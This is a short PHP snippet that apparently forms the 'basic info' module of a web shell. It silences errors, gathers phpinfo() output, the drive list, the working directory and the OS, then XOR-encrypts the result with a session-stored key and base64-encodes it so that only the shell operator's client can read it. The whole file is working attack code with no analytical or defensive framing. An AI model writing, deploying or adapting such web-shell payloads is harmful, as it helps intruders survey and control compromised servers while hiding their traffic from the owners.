error_reporting(0);
function main() {
    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();
    $driveList ="";
    if (stristr(PHP_OS,"windows")||stristr(PHP_OS,"winnt"))
    {
        for($i=65;$i<=90;$i++)
    	{
    		$drive=chr($i).':/';
    		file_exists($drive) ? $driveList=$driveList.$drive.";":'';
    	}
    }
	else
	{
		$driveList="/";
	}
    $currentPath=getcwd()."/";
	$osInfo=PHP_OS;
	$line="</br>";
    $result="<div style='color:#333;line-height:20px;font-size:12px'>WebPath:".$currentPath.$line."DriveList:".$driveList.$line."OS:".$osInfo."</div>".$line.$info;
    session_start();
    $key=$_SESSION['k'];
    echo encrypt($result, $key);
}

function encrypt($data,$key)
{
	for($i=0; $i<strlen($data); $i++) {
    	$data[$i] = $data[$i] ^ $key[$i+5&15]; 
    }
	return base64_encode($data);
}